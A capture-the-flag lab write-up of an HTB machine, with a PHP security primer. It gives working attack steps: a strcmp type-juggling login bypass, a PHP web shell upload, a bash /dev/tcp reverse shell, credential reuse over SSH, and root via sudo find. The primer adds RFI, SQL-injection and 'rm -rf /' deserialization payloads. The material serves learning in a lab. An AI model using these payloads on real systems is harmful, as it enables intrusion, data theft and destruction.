# PHP Vulnerability Example (PHP type juggling)

Note: This cookbook is inspired by the official write-up (prepared by "dotguy") for an HTB machine that features an insecure implementation of the ```strcmp``` function to validate username and password combinations. Since this challenge requires a deeper understanding of PHP, I'll take this opportunity to refresh and expand my knowledge of the language, which has always been somewhat elusive to me. I'll aim to cover the essentials in a way that makes sense from my perspective.

## Introduction

PHP is a server-side scripting language, primarily used to generate dynamic content for web pages. When a user requests a page, the PHP code runs on the server, processes data (like form submissions, database queries, etc.), and then sends the final HTML to the browser.

Here’s a high-level breakdown:

- **Server-Side:** PHP code executes on the server, and users never see the actual PHP code—only the output (typically HTML, JSON, etc.).

- **Embedded in HTML:** PHP is usually embedded directly within HTML, making it easy to mix server-side logic with the client-side interface.

- **Loose Typing:** PHP is dynamically typed, meaning you don’t have to declare variable types, and it handles type conversions automatically.

- **Whitespace Insignificant:** In PHP, whitespace is not significant (unlike Python). This means spaces, tabs, and newlines don't affect the logic of the code. However, proper indentation still helps with readability.

I find it interesting that PHP variables don’t need explicit initialization. You can declare and assign a value to a variable on the fly by just using the ```$``` symbol, like ```$var = "Hello";```. PHP will automatically handle the type, and if you reference an uninitialized variable, it won’t throw an error, though it will generate a warning depending on your error reporting settings. This makes it flexible, but you need to be careful, as uninitialized or mistyped variables can lead to bugs, especially in complex logic. Also, PHP does automatic type juggling, so if you use a string where an integer is expected, PHP might convert it behind the scenes.

It’s good practice to always initialize variables properly to avoid confusion and errors. If you're trying to get comfortable with parsing PHP code, focusing on this loose type system and handling of variables will help make things clearer. Here’s a simple PHP example that shows variable initialization and a bit of type juggling in action:

```
<?php
    // No need for explicit type declaration
    $name = "Misty";  // String
    $age = 25;        // Integer

    // PHP will automatically concatenate strings and integers
    echo "Hello, my name is " . $name . " and I am " . $age . " years old."; 

    // Type juggling example
    $sum = "5" + 10;  // PHP converts the string "5" to an integer
    echo "The sum is: " . $sum;  // Output: The sum is: 15

    // Referencing an uninitialized variable
    echo $undefinedVar;  // Outputs a warning, but no fatal error
?>
```

In this script:

- ```$name``` and ```$age``` are initialized as a string and an integer.

- PHP allows concatenation of different types (string + int).

- Type juggling is shown when the string ```"5"``` is automatically converted to an integer for addition.

- An uninitialized variable is used at the end, which would generate a warning if error reporting is enabled, but the script would still run.

PHP syntax is a mix of C-style languages (like Java or C++) and HTML. Here are some key elements:

- Variables: Start with ```$``` (e.g., ```$name = "Misty";```)

- Functions: Defined using ```function``` (e.g., ```function sayHello() { echo "Hello!"; }```)

- Control structures: ```if```, ```else```, ```while```, ```for```, etc., similar to C-style languages.

- Echoing HTML: You can intermix PHP and HTML easily (e.g., ```<?php echo "<h1>Hello!</h1>"; ?>```).

- Comments: ```//``` for single-line, ```/* */``` for multi-line.

## PHP Basics for Penetration Testing

**1. Common PHP Vulnerabilities**

- LFI (Local File Inclusion): PHP functions like ```include()``` or ```require()``` can allow an attacker to include arbitrary files if the input is not properly sanitized. Example:

```
include($_GET['page']);
```

If ```page``` is set to something like ```../../etc/passwd```, an attacker can read system files.

- RFI (Remote File Inclusion): If an attacker can control the path to a file loaded remotely, they can inject malicious code. This is similar to LFI, but with remote files.

```
include('http://malicious.site/malware.php');
```

- SQL Injection: Insecure handling of SQL queries can allow attackers to inject SQL commands through PHP inputs, leading to database compromise. Example:

```
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

If not properly sanitized, an attacker could append ```'; DROP TABLE users; --``` to drop the entire users table.

**2. PHP Superglobals**

- ```$_GET``` & ```$_POST```: These arrays hold user inputs from query strings or form submissions. Without proper validation, they can introduce security flaws like XSS, SQL Injection, or CSRF.


- ```$_SESSION``` & ```$_COOKIE```: Session management is crucial. Attackers can hijack sessions by manipulating session cookies or injecting malicious values into session variables.

Example of session-based authentication:

```
session_start();
$_SESSION['user'] = $username;
```

If not properly protected, session hijacking is possible through methods like cross-site scripting (XSS).

**3. Error Handling**

- Verbose Error Messages: PHP can output detailed error messages that reveal sensitive information (file paths, database errors, etc.). Example of poor error handling:

```
echo mysqli_error($conn);
```

Attackers can use these errors to gain insights about the system architecture, database structure, or exploitable functions. Proper error handling should log errors to a file without exposing them to users.

**4. Function Security**

- ```strcmp()``` & Timing Attacks: The ```strcmp()``` function compares strings, but it can be susceptible to timing attacks, where attackers infer the correct value based on how long the function takes to return.

For more secure comparisons, use ```hash_equals()``` which mitigates timing attacks. Example of insecure usage:

```
if (strcmp($password, $_POST['password']) == 0) { 
    echo 'Authenticated';
}
```

Use this instead:

```
if (hash_equals($stored_password, $_POST['password'])) { 
    echo 'Authenticated';
}
```

**5. PHP Object Injection**

- Insecure Deserialization: When PHP unserializes user-controlled data, an attacker can manipulate the input to inject arbitrary code or gain system control. Example:

```
$obj = unserialize($_GET['data']);
```

An attacker could craft a serialized payload that exploits vulnerabilities in object methods, leading to remote code execution (RCE). To prevent this, avoid unserializing untrusted data or use modern alternatives like json_decode() for safer data handling.

Serialization is the process of converting an object or data structure into a string format that can easily be stored or transmitted. In PHP, ```serialize()``` turns an object into a string, and ```unserialize()``` does the reverse, reconstructing the object from that string.

When you unserialize user-controlled data (data that comes from a user, such as form inputs, cookies, or GET/POST parameters), you’re allowing the user to supply a serialized string that will be reinterpreted as an object by your PHP code. If the serialized string has been crafted maliciously, it can trigger unintended behavior in your application, leading to security risks like remote code execution (RCE) or data manipulation.

How Does the Attack Work?

- Unserializing Objects: Imagine PHP receives a serialized object from the user, something like:

```
O:8:"UserInfo":2:{s:4:"name";s:4:"John";s:3:"age";i:30;}
```

This creates a ```UserInfo``` object with the properties ```name = "John"``` and ```age = 30```.

- Crafting Malicious Data: Now imagine the user can manipulate this input. They could serialize an object that triggers a class method, such as ```__destruct()``` (the PHP equivalent of a destructor method), that performs an unintended action when the object is destroyed. Example:

```
O:8:"UserInfo":2:{s:4:"name";s:4:"John";s:8:"__wakeup";O:4:"Exec":1:{s:4:"cmd";s:10:"rm -rf /";}}
```

This would inject a payload that could potentially execute destructive system commands (like deleting all files) if the application does not properly restrict such actions.

- Under the Hood: When PHP unserializes this data, it essentially executes the internal logic tied to the object’s class methods (such as ```__destruct()``` or ```__wakeup()```), which can cause harmful side effects.

Why Use ```json_decode()``` Instead?

Unlike ```unserialize()```, which is tied to PHP objects and methods (and thus can trigger unexpected behaviors), ```json_decode()``` is used for simpler data structures like arrays and primitive values (strings, integers). JSON does not contain executable code, so it is much safer when handling user inputs.

Here’s an example of switching to ```json_decode()```:

Unsafe unserialization example:

```
$data = unserialize($_GET['data']); // Dangerous if $data is user-controlled!
```

Safer ```json_decode()``` example:

```
$data = json_decode($_GET['data'], true); // Converts JSON string to a safe array.
```

Why This Matters:

- ```unserialize()``` allows an attacker to inject code by crafting malicious serialized data that interacts with the server-side object system.

- ```json_decode()``` is purely for handling data like strings and numbers, so there's no risk of triggering code execution.

Note: I find it interesting how both PHP unserialization and SSTI attacks exploit the internal logic or behavior of the server when processing input, allowing attackers to inject code or manipulate the system. They’re both about gaining control of the processing logic via crafted input, but they target different technologies (unserialization vulnerabilities vs. templating engines).

## The Task at Hand

And now I am ready to delve into the official HTB write-up: *As always, we will check for open ports using an Nmap scan. The scan shows two ports open - Port 80 (HTTP) and Port 22 (SSH). We start off with enumerating port 80 using our web browser.*

*We can see a very simple webpage with the provided links in the navigation bar. By clicking the Login button, we are presented with the login page. Notice the URL of the login page is ```http://10.10.10.48/login/login.php```.*

*We can see that there is a login directory, where the ```login.php``` is stored. Let's try accessing that directory by removing ```login.php``` from the end of the URL.*

*The ```/login``` folder seems to be configured as listable, and we can see the php files that are responsible for the login task. There's also a ```.swp``` file, which is a swap file. Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor like Vim from editing the same file. More information on swap files can be found [here](https://www.techtarget.com/searchwindowsserver/definition/swap-file-swap-space-or-pagefile).*

*The swap file was probably created due to a crash of the Vim application while the developer was editing the file. The file ended up being unnoticed and left in the web application files where anyone can download it by clicking on the ```login.php.swp``` in the listable directory. The web server is set up to handle requests to ```.php``` files by running the PHP code in the file, but because the extension of the swap file isn't ```.php```, the web server returns the raw code as text.*

*Let us click on this file and download it for further analysis. Navigate to the folder where the file is downloaded and read it to see if any parts of the code from ```login.php``` were saved. Typically the most straight forward way to recover a Vim swap file is with the ```vim -r [swap file]```. But sometimes these files can be particular and won't recover.*

*As ```.swp``` is a temporary file, it contains a lot of non-human-readable content, thus we will use the ```strings``` utility to read this swap file because strings will only display the human-readable text.*

```
strings login.php.swp
```

*The Linux ```strings``` command makes it possible to view the human-readable characters within any file. The main purpose of using the ```strings``` command is to work out what type of file you're looking at, but you can also use it to extract text.*

Note: I will skip the output from the strings command for the sake of brevity.

*After checking the code, we can see HTML/PHP code, but it's out of order and a bit jumbled. Still, there's enough there that we can figure out what the code is trying to do. Specifically, the block of PHP code that handles login appears to be upside down. To make it look normal we can place the output of the ```strings``` command inside a new file and read it with the ```tac``` utility, which reads files similar to ```cat``` but instead does so in a backwards manner.*

```
strings login.php.swp >> file.txt
tac file.txt
```

*Now the output is much better for reading. After analyzing the file, here's the part that is interesting:*

```
<?php
session_start();

if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
?>
```

This code starts with ```session_start()```, which initiates a session. Sessions in PHP allow the server to track user activity across multiple pages, making it possible to store and access data for a specific user between requests.

Next, the code checks if both the username and password fields from the user (```$_POST```) are not empty. These fields represent the form data submitted by the user.

If both fields have values, the ```config.php``` file is included. This file is expected to contain predefined username and password variables (likely fetched from a configuration or database).

After including ```config.php```, the code compares the user-submitted username (```$_POST['username']```) with the predefined ```$username``` using the ```strcmp()``` function. This function compares two strings and returns ```0``` if they are identical.  In this context, the variables ```$username``` and ```$password``` are like keys, and their assigned values (the strings) are what we're comparing against. It's a simple key-value pairing where the key is the variable name, and the value is the data stored in that variable, like a username or password string.

When we check ```strcmp($username, $_POST['username'])```, we're comparing the value stored in ```$username``` (the key) with the value submitted by the user (```$_POST['username']```). If they match, the condition evaluates to true, allowing further code execution.

In short:

- If the username matches, it proceeds to check the password using another ```strcmp()``` function.

- If the password also matches, the session variable ```$_SESSION['user_id']``` is set to ```1```, marking the user as authenticated, and they are redirected to the ```/upload.php``` page using the ```header()``` function.

If either the username or password does not match, the code triggers a JavaScript ```alert()``` popup notifying the user with the message "Wrong Username or Password."

Now, here's the issue:

```
if (strcmp($username , $_POST['username']) == 0) {
		if (strcmp($password, $_POST['password']) == 0) {
```

And now back to what the write-up has to say: *The developer is using the ```strcmp``` function to check the username and password combination. This function is used for string comparison and returns ```0``` when the two inputted values are identical, however, it is insecure and the authentication process can potentially be bypassed without having a valid username and password.*

*This is due to the fact that if ```strcmp``` is given an empty array to compare against the stored password, it will return ```NULL```. In PHP the ```==``` operator only checks the value of a variable for equality, and the value of ```NULL``` is equal to ```0```. The correct way to write this would be with the ```===``` operator which checks both value and type. These are prominently known as "Type Juggling bugs".*

*In PHP, variables can be easily converted into arrays if we add ```[]``` in front of them. For example:*

```
$username = "Admin"
$username[] = "Admin"
```

*Adding ```[]``` changes the variable ```$username``` to an array, which means that ```strcmp()``` will compare the array instead of a string.*

```
if (strcmp($username , $_POST['username']) == 0) {
		if (strcmp($password, $_POST['password']) == 0) {
```

*In the above code we see that if the comparison succeeds and returns ```0```, the login is successful. If we convert those variables into empty arrays ( ```$username[]``` & ```$password[]``` ), the comparison will return ```NULL```, and ```NULL == 0``` will return true, causing the login to be successful.*

*In order to exploit this vulnerability, we will need to intercept the login request in BurpSuite. To do so fire up BurpSuite and configure the browser to use it as a proxy, either with the FoxyProxy plugin or the Browser configuration page. Then send a login request with a random set of credentials and catch the request in Burp.*

*Change the POST data as follows to bypass the login.*

```
username[]=admin&password[]=pass
```

Here is the whole request:

```
POST /login/login.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.129.95.184
Connection: close
Referer: http://10.129.95.184/login/login.php
Cookie: PHPSESSID=j6sut9tb6rurr1k8kt98ugijla
Upgrade-Insecure-Requests: 1

username[]=admin&password[]=pass
```

*This converts the variables to arrays and after forwarding the request, ```strcmp()``` returns ```true``` and the login is successful. Once logged in, we see a file upload functionality.*

Note: Once you've modified the request and sent it with Forward, turning off intercept allows your browser to receive the response from the server normally. So, after the exploit works, disabling intercept lets you see the result in the browser—like getting logged in. It’s easy to forget that step, but it’s crucial to complete the process smoothly!

## Foothold

*Since the webpage can execute PHP code, we can try uploading a PHP file to check if PHP file uploads are allowed or not, and also check for PHP code execution. Let us create a PHP file with the ```phpinfo()``` function, which outputs the configurational information of the PHP installation.*

```
echo "<?php phpinfo(); ?>" > test.php
```

*After ```test.php``` has been created, choose the file after clicking the Upload button, and we will be presented with the following notification, which shows that the file was successfully uploaded.*

*Next, we need to figure out where uploaded files are stored. To do that, we will use Gobuster to do a directory brute force.*

```
gobuster dir --url http://10.10.10.48/ --wordlist /usr/share/wordlists/dirb/big.txt
```

*The scan shows that a folder called ```_uploaded``` exists. We will navigate to it to see if our file is there. It appears that this folder has also been set as listable and we can see all the files that are uploaded.*

*Upon clicking on ```test.php```, we can see the output of the ```phpinfo()``` command, thus confirming code execution.*

*Let us now create a PHP web shell which uses the ```system()``` function and a ```cmd``` URL parameter to execute system commands. Place the following code into a file called ```webshell.php```.*

```
<?php echo system($_REQUEST['cmd']);?>
```

*We are making use of the ```$_REQUEST``` method to fetch the ```cmd``` parameter because it works for fetching both URL parameters in ```GET``` requests and HTTP request body parameters in case of ```POST``` requests. Furthermore, we also use a POST request later in the walkthrough, thus using the ```$_REQUEST``` method is the most effective way to fetch the ```cmd``` parameter in this context.*

*After the web shell has been created, upload it as shown previously.*

*After the file has been uploaded, click on it in the browser and it will show a blank page, however, if we add a system command in the ```cmd``` URL parameter, the PHP backend will execute its value, e.g: ```?cmd=id.``` For example:*

```
http://10.129.95.184/_uploaded/webshell.php?cmd=id
```

*The above URL returns with the output of the ```id``` command, letting us know that Apache is running in the context of the user ```www-data```. Let's intercept this request in BurpSuite and send it to the repeater tab by pressing the CTRL+R shortcut, or by right-clicking inside the request and selecting Send to Repeater.*

*Now that we know we can execute code on the remote system, let's attempt to get a reverse shell. The current request is an HTTP GET request and we can attempt to use it to send a command that will grant us a reverse shell on the system, however, it is likely that one might encounter errors due to the presence of special characters in the URL (even after URL encoding them). Instead, let us convert this GET request to a POST request and send the reverse shell command as an HTTP POST parameter.*

*Right-click inside the Request body box, and click on the "Change request method" in order to convert this HTTP GET request to an HTTP POST request.*

*In the repeater tab, we can alter the request and set the following reverse shell payload as a value for the ```cmd``` parameter.*

```
/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
```

*Here is how it should look:*

```
POST /_uploaded/webshell.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=j6sut9tb6rurr1k8kt98ugijla
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.186/443 0>&1'
```

*This reverse shell payload will make the remote host connect back to us with an interactive bash shell on the specified port that we are listening on.*

*In order to execute our payload, we will have to first URL encode it. For URL encoding the payload, select the payload text in the request body and press CTRL+U.*

*Now it looks like this:*

```
POST /_uploaded/webshell.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=j6sut9tb6rurr1k8kt98ugijla
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.186/443+0>%261'
```

*It's important to URL encode the payload, or else the server will not interpret the command correctly. For example, in the POST body, the ```&``` character is used to signal the start of a new parameter. But we have two ```&``` characters in our string that are both a part of the ```cmd``` parameter. By encoding them, this tells the server to treat this entire string as part of ```cmd```.*

*Let's now start a Netcat (or ncat, which I like better) listener on port 443 and then send the request in Burp for the payload to execute.*

```
sudo ncat -lvnp 443
```

*A reverse shell on the system is successfully received.*

```
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.95.184:55674.
bash: cannot set terminal process group (1243): Inappropriate ioctl for device
bash: no job control in this shell
www-data@base:/var/www/html/_uploaded$
```

## Lateral Movement

*As we already know, the Apache server is running as the ```www-data``` use and the shell we received is also running in the context of this user. ```www-data``` is a default user on systems where web servers are installed and usually has minimal privileges. Let's enumerate the system to see if we can find any interesting information that might allow us to escalate our privileges.*

*We will first check the configuration file in the ```login``` folder that we found earlier. These configuration files often include credentials that are used to communicate with SQL or other types of data storage servers. Let's read it.*

```
cat /var/www/html/login/config.php
```

And here is the output from my Kali machine:

```
www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
cat /var/www/html/login/config.php
<?php
$username = "admin";
$password = "thisisagoodpassword";www-data@base:/var/www/html/_uploaded$
```

*The ```config.php``` file reveals a set of credentials. System administrators often re-use passwords between web and system accounts so that they do not forget them. Let us enumerate further to see if this password is valid for any system user. To do that, we will first list the files in the ```/home``` directory to quickly identify the users on the system.*

```
ls /home
```

*A folder called John is found, which gives us a valid username.*

*The ```su``` command can usually be used to switch to a different user in Linux, however, as our shell is not fully interactive, this command will fail. There are methods for upgrading this shell to an interactive one, but luckily, the Nmap scan showed that port 22 is open, which means we can attempt to log in as the user John over SSH with the password that we identified.*

```
ssh john@10.129.95.184
```

*This is successful and the flag can be found in the users home directory, i.e. ```/home/john/user.txt```.

Note: I always execute the following command for finding flags:

```
find / -name user.txt 2>/dev/null
```

## Privilege Escalation

*We now need to escalate our privileges to that of the root user, who has the highest privileges in the system. Instead of running a system enumeration tool like linPEAS , let us first perform some basic manual enumeration. Upon checking the ```sudo -l``` command output, which lists the sudo privileges that our user is assigned, we see that user john can run the find command as a root.*

```
sudo -l
```

And the output:

```
john@base:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```

*It is rarely a good idea to allow a system user to run a binary with elevated privileges, as the default binaries on Linux often contain parameters that can be used to run system commands. A good list of these binaries can be found in the [GTFOBins](https://gtfobins.github.io/) website.*

Note: GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. For windows systems, the equivalent of this is the [LOLBAS](https://lolbas-project.github.io/).

*Once we navigate to the GTFObins website, we can search for ```find```. According to GTFOBins , we need to run the following command in order to escalate our privileges:*

```
sudo find . -exec /bin/sh \; -quit
```

Note: I have decided to research this a bit more. Here is a quick breakdown.

- ```sudo find .```: Runs the find command with elevated privileges, searching from the current directory (```.```).

- ```-exec /bin/sh \;```: For each file find encounters, it executes ```/bin/sh```, which gives you a shell. The backslash before ```;``` is to escape it so the shell interprets it correctly.

- ```-quit```: Tells find to stop after the first match, meaning it only spawns one shell.

*Once we run this command, we successfully obtain a root shell.*

```
john@base:~$ sudo find . -exec /bin/sh \; -quit
[sudo] password for john: 
# whoami
root
#
```

The root flag can be found using my command of choice:

```
find / -name root.txt 2>/dev/null
```

Note:  ```Ctrl + D``` should be the easiest method for gracefully closing shells spawned through a command like ```/bin/sh```. This sends an EOF (End Of File) signal, which usually terminates the shell.

This example is now concluded.
